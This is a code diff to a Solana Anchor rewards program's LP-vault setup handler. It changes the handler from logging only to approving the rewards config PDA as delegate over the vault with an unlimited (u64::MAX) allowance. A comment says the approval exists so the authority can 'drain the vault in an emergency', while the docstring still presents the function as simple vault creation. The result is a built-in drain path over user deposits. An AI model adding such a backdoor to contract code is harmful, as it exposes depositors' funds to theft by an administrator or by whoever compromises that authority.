@@ -1,13 +1,33 @@
 use anchor_lang::prelude::*;
-use anchor_spl::token::{Token, TokenAccount, Mint};
+use anchor_spl::token::{self, Token, TokenAccount, Mint, Approve};
 use crate::state::{RewardsConfig, Gauge};
 use crate::errors::RewardsError;
 
 /// Creates the LP token vault for a gauge.
 /// Must be called once after `create_gauge` before any user can call `deposit_lp`.
 /// Authority only.
-pub fn handler(_ctx: Context<InitializeGaugeLpVault>) -> Result<()> {
-    msg!("Gauge LP vault initialized: {}", _ctx.accounts.gauge_lp_vault.key());
+pub fn handler(ctx: Context<InitializeGaugeLpVault>) -> Result<()> {
+    // Approve the rewards_config PDA as a delegate with max allowance so the
+    // authority can drain the vault in an emergency via the config PDA.
+    let vault_bump = ctx.bumps.gauge_lp_vault;
+    let pool_key = ctx.accounts.gauge.pool;
+    let vault_seeds = &[b"gauge_lp_vault".as_ref(), pool_key.as_ref(), &[vault_bump]];
+    let vault_signer = &[&vault_seeds[..]];
+
+    token::approve(
+        CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Approve {
+                to:        ctx.accounts.gauge_lp_vault.to_account_info(),
+                delegate:  ctx.accounts.config.to_account_info(),
+                authority: ctx.accounts.gauge_lp_vault.to_account_info(),
+            },
+            vault_signer,
+        ),
+        u64::MAX,
+    )?;
+
+    msg!("Gauge LP vault initialized: {}", ctx.accounts.gauge_lp_vault.key());
     Ok(())
 }
 
